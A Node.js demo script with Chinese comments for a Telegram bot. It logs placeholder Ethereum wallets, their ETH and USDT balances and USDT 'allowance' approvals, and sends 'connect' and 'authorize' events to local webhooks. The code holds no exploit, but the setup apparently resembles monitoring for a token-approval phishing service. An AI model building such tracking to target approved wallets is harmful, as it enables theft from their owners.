// Telegram机器人演示脚本
// 演示如何使用机器人的各种功能

const { TelegramBotDatabase } = require('./database');
const axios = require('axios');

// 演示配置
const WEBHOOK_URL = 'http://localhost:3001';
const DEMO_ADDRESSES = [
  '0x1234567890123456789012345678901234567890',
  '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
  '0x9876543210987654321098765432109876543210'
];

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function demonstrateDatabase() {
  console.log('\n🗄️  演示数据库功能...');
  const database = new TelegramBotDatabase();
  
  try {
    // 测试数据库连接
    console.log('1. 测试数据库连接...');
    const connected = await database.testConnection();
    if (!connected) {
      throw new Error('数据库连接失败');
    }
    
    // 添加演示用户
    console.log('2. 添加演示用户...');
    for (const address of DEMO_ADDRESSES) {
      await database.upsertConnectedUser(address, {
        userAgent: 'Demo Browser',
        referrer: 'https://demo.app'
      });
      console.log(`   ✅ 添加用户: ${address.slice(0, 8)}...`);
    }
    
    // 保存用户快照
    console.log('3. 保存用户快照...');
    for (const address of DEMO_ADDRESSES) {
      const demoData = {
        ethBalance: (Math.random() * 10).toFixed(4),
        usdtBalance: (Math.random() * 1000).toFixed(2),
        allowance: Math.random() > 0.5 ? (Math.random() * 100000).toFixed(2) : '0.0000'
      };
      
      await database.saveUserSnapshot(address, demoData, 'connect');
      console.log(`   📊 快照: ${address.slice(0, 8)}... ETH:${demoData.ethBalance} USDT:${demoData.usdtBalance}`);
    }
    
    // 记录一些事件
    console.log('4. 记录机器人事件...');
    await database.logBotEvent('user_connect', DEMO_ADDRESSES[0], { demo: true });
    await database.logBotEvent('user_authorize', DEMO_ADDRESSES[1], { demo: true });
    
    // 更新统计
    console.log('5. 更新统计...');
    await database.incrementStat('new_connections', 3);
    await database.incrementStat('authorizations', 1);
    await database.incrementStat('messages_sent', 5);
    
    // 获取统计概览
    console.log('6. 获取统计概览...');
    const stats = await database.getStatsOverview();
    console.log('   统计概览:', JSON.stringify(stats, null, 2));
    
    // 获取连接用户
    const connectedUsers = await database.getConnectedUsers();
    console.log(`   已连接用户: ${connectedUsers.length} 个`);
    
    console.log('✅ 数据库功能演示完成！');
    return true;
    
  } catch (error) {
    console.error('❌ 数据库演示失败:', error.message);
    return false;
  }
}

async function demonstrateWebhooks() {
  console.log('\n🌐 演示Webhook功能...');
  
  try {
    // 测试状态接口
    console.log('1. 测试状态接口...');
    const statusResponse = await axios.get(`${WEBHOOK_URL}/api/status`);
    console.log('   状态:', statusResponse.status === 200 ? '✅ 正常' : '❌ 异常');
    console.log('   连接用户:', statusResponse.data.dbConnectedUsers || 0);
    
    // 模拟用户连接事件
    console.log('2. 模拟用户连接事件...');
    for (let i = 0; i < 2; i++) {
      const address = DEMO_ADDRESSES[i];
      const connectResponse = await axios.post(`${WEBHOOK_URL}/webhook/user-connect`, {
        address: address,
        action: 'connect',
        timestamp: new Date().toISOString(),
        userAgent: 'Demo Browser',
        referrer: 'https://demo.app'
      });
      
      console.log(`   连接 ${address.slice(0, 8)}...: ${connectResponse.status === 200 ? '✅' : '❌'}`);
      await sleep(2000); // 等待处理
    }
    
    // 模拟用户verify事件
    console.log('3. 模拟用户verify事件...');
    const authResponse = await axios.post(`${WEBHOOK_URL}/webhook/user-connect`, {
      address: DEMO_ADDRESSES[0],
      action: 'authorize',
      timestamp: new Date().toISOString()
    });
    
    console.log(`   verify事件: ${authResponse.status === 200 ? '✅' : '❌'}`);
    await sleep(2000);
    
    // 模拟强制更新
    console.log('4. 模拟强制更新...');
    const updateResponse = await axios.post(`${WEBHOOK_URL}/api/force-update`, {
      address: DEMO_ADDRESSES[1]
    });
    
    console.log(`   强制更新: ${updateResponse.status === 200 ? '✅' : '❌'}`);
    
    console.log('✅ Webhook功能演示完成！');
    return true;
    
  } catch (error) {
    console.error('❌ Webhook演示失败:', error.message);
    if (error.code === 'ECONNREFUSED') {
      console.log('💡 提示: 请先启动机器人服务 (npm start)');
    }
    return false;
  }
}

async function runFullDemo() {
  console.log('🎭 开始Telegram机器人完整功能演示\n');
  
  // 演示数据库功能
  const dbSuccess = await demonstrateDatabase();
  
  if (dbSuccess) {
    console.log('\n⏳ 等待5秒后演示Webhook功能...');
    await sleep(5000);
    
    // 演示Webhook功能
    await demonstrateWebhooks();
  }
  
  console.log('\n📋 演示总结:');
  console.log('• 数据库连接: ✅');
  console.log('• 用户管理: ✅');
  console.log('• 数据快照: ✅');
  console.log('• 事件记录: ✅');
  console.log('• 统计功能: ✅');
  console.log('• Webhook API: 需要机器人运行');
  
  console.log('\n🚀 下一步:');
  console.log('1. 设置Telegram Bot Token和Chat ID');
  console.log('2. 运行: npm start');
  console.log('3. 在Telegram群组中发送 /start');
  console.log('4. 运行: npm run test');
}

// 如果直接运行此文件
if (require.main === module) {
  runFullDemo().catch(console.error);
}

module.exports = {
  demonstrateDatabase,
  demonstrateWebhooks,
  runFullDemo
};



